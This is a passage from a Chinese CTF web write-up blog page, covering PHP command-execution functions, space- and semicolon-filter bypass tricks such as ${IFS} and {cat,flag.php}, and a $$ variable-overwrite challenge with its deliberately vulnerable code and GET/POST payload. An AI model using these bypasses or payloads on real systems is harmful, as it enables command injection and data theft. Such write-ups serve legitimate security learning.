+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
+
+<p>3.<strong>空格绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符 </span><br><span class="line">%09(需要php环境) </span><br><span class="line">$&#123;IFS&#125; </span><br><span class="line">$IFS$9 </span><br><span class="line">&#123;cat,flag.php&#125; &#x2F;&#x2F;用逗号实现了空格功能 %20 %09</span><br></pre></td></tr></table></figure>
+
+<p>4.<strong>过滤了分号可以用?&gt;绕过</strong></p>
+<p>绕过过滤的方法还有很多，慢慢学，就不复制粘贴了，***<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/107676580?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160655551419721940213768%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160655551419721940213768&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107676580.first_rank_v2_pc_rank_v29&utm_term=ctfrce">参考资料</a>***</p>
+<hr>
+<img src="/2020/11/24/web-writeup/5.jpeg" style="zoom: 50%;">
+
+
+
+<hr>
+<h2 id="php变量覆盖2"><a href="#php变量覆盖2" class="headerlink" title="php变量覆盖2"></a>php变量覆盖2</h2><h3 id="一-审题-2"><a href="#一-审题-2" class="headerlink" title="一.审题"></a>一.审题</h3><p>该题也是变量覆盖，与之前不同的是这是<code>$$</code>使用不当造成的，首先分析代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  <span class="comment">//包含文件</span></span><br><span class="line"><span class="variable">$_403</span> = <span class="string">&quot;拒绝访问&quot;</span>;  <span class="comment">//定义参数</span></span><br><span class="line"><span class="variable">$_200</span> = <span class="string">&quot;欢迎~~~&quot;</span>;<span class="comment">//定义参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&quot;POST&quot;</span>)<span class="comment">//判断传参方式是否为post</span></span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;sssssssspost…&quot;</span>);<span class="comment">//不是post便输出</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]) )<span class="comment">//判断是否post了flag的参数</span></span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$_403</span>);<span class="comment">//不是就输出</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)<span class="comment">//foreach函数来遍历数组中的值，用get方法传输的数据当做数组进行遍历，并将遍历的参数赋值给key，将参数值复制给value。</span></span><br><span class="line">  <span class="variable">$$key</span> = <span class="variable">$$value</span>;<span class="comment">//这里将键和值又当做变量来使用。我们用get方法传递：_200=flag,经过$$key = $$value的处理后，就会变为$_200=$flag，这样就会将原来的$_200的值覆盖掉，换成$flag的值</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)<span class="comment">//同10，方式变为post</span></span><br><span class="line">  <span class="variable">$$key</span> = <span class="variable">$value</span>;<span class="comment">//这里将只是将数组键当做下一个变量，将数组的值当做这个$$key的值。例如post方法传入flag=asd，则处理后变成$flag=asd。这样就造成将我们需要获取的flag的值给覆盖掉了</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span> )<span class="comment">//判断post的flag参数值是否为原本定义的$flag的值，虽然不知道原本的$flag变量值，但是我们可先将$flag的值通过第一个数组遍历赋值给$_200,之后再随便赋给$flag一个值后通过die($_200)输出出来$flag的值，所以$flag原本的值即使被覆盖也无所谓，因为我们早已将$flag的值赋给$_200了，而最后输出的$_200也必然是两个flag变量值，一个为真正的flag一个为随便输入的</span></span><br><span class="line">      <span class="keyword">die</span>(<span class="variable">$_403</span>);<span class="comment">//输出$_403</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is your flag : &quot;</span>. <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;<span class="comment">//输出$flag的值</span></span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$_200</span>);<span class="comment">//输出$_200</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<p><u>Get方法传输</u>：<code>?_200=flag</code><br><u>Post方法传输</u>：<code>flag=asd</code></p>
+<h3 id="二-学习笔记-2"><a href="#二-学习笔记-2" class="headerlink" title="二.学习笔记"></a>二.学习笔记</h3><h4 id="1-变量覆盖"><a href="#1-变量覆盖" class="headerlink" title="1.$$变量覆盖"></a>1.$$变量覆盖</h4><p><strong>$$</strong> 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的值作为变量的值。因此就产生了变量覆盖漏洞。</p>
+<h4 id="2-PHP-foreach-遍历数组"><a href="#2-PHP-foreach-遍历数组" class="headerlink" title="2.PHP foreach 遍历数组"></a>2.PHP foreach 遍历数组</h4><p>foreach 语句用于循环遍历数组。<br>每进行一次循环，当前数组元素的值就会被赋值给 value 变量(数组指针会逐一地移动) - 以此类推。<br><strong>它的语法是：</strong><br><code>foreach (array as value)</code> 或者<code>foreach (array as $key =&gt; $value)</code>【任选其一】<code>&#123;</code></p>
+<p><code>code to be executed;</code>//要执行的代码</p>
+<p><code>&#125;</code>  注：当试图将其用于其它数据类型或者一个未初始化的变量时会产生错误。</p>
+<p>上述语法中，每次循环将当前单元的值赋给 $value 并且数组内部的指针向前移一步。在第二种语法格式中还将当前单元的键名也会在每次循环中赋给变量 $key。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr_day</span> = <span class="keyword">array</span>(<span class="string">&quot;Friday&quot;</span>=&gt;<span class="number">18</span>, <span class="string">&quot;Saterday&quot;</span>=&gt;<span class="number">19</span>, <span class="string">&quot;Sunday&quot;</span>=&gt;<span class="number">20</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr_day</span> <span class="keyword">as</span> <span class="variable">$day</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$day</span>,<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="number">18</span></span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用数组键值：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr_Troy3e</span> = <span class="keyword">array</span>(<span class="string">&quot;T&quot;</span>=&gt;da, <span class="string">&quot;r&quot;</span>=&gt;lao, <span class="string">&quot;o&quot;</span>=&gt;qing， <span class="string">&quot;y&quot;</span>=&gt;dai，<span class="string">&quot;3&quot;</span>=&gt;dai，<span class="string">&quot;e&quot;</span>=&gt;wo);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr_Troy3e</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$TS</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>,<span class="string">&#x27;: &#x27;</span>,<span class="variable">$haha</span>,<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输出</span></span><br><span class="line">T: da</span><br><span class="line">r: lao    </span><br><span class="line">o: qing</span><br><span class="line">y: dai    </span><br><span class="line"><span class="number">3</span>: dai   </span><br><span class="line">e: wo   </span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2021/01/16/BUUctf-wp/" rel="next" title="BUUctf-wp">
+      BUUctf-wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web-writeup-1"><span class="nav-number">1.</span> <span class="nav-text">web-writeup-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#basic-rce"><span class="nav-number">1.1.</span> <span class="nav-text">basic rce</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-%E5%AE%A1%E9%A2%98"><span class="nav-number">1.1.1.</span> <span class="nav-text">一.审题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="nav-number">1.1.2.</span> <span class="nav-text">二.学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">1.什么是一句话木马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%85%A5%E4%BE%B5%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">2.入侵条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">3.漏洞成因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-webshell"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">4.webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#a-%E5%AE%9A%E4%B9%89"><span class="nav-number">1.1.2.4.1.</span> <span class="nav-text">a.定义</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#b-%E5%88%86%E7%B1%BB"><span class="nav-number">1.1.2.4.2.</span> <span class="nav-text">b.分类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E9%A2%98%E5%88%86%E6%9E%90"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">本题分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">1.2.</span> <span class="nav-text">php变量覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-%E5%AE%A1%E9%A2%98%EF%BC%8C%E5%81%9A%E9%A2%98%E5%88%86%E6%9E%90"><span class="nav-number">1.2.1.</span> <span class="nav-text">一.审题，做题分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">二.学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-extract-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">1.extract()变量覆盖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%85%B6%E4%BB%96"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">2.其他</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#basic-rce2"><span class="nav-number">1.4.</span> <span class="nav-text">basic rce2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-%E5%AE%A1%E9%A2%98-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">一.审题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="nav-number">1.4.2.</span> <span class="nav-text">2.学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">正则表达式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E7%9A%84%E8%BF%87%E6%BB%A4%E5%86%85%E5%AE%B9"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">主要的过滤内容</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%962"><span class="nav-number">1.5.</span> <span class="nav-text">php变量覆盖2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-%E5%AE%A1%E9%A2%98-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">一.审题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2"><span class="nav-number">1.5.2.</span> <span class="nav-text">二.学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">1.$$变量覆盖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-PHP-foreach-%E9%81%8D%E5%8E%86%E6%95%B0%E7%BB%84"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">2.PHP foreach 遍历数组</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
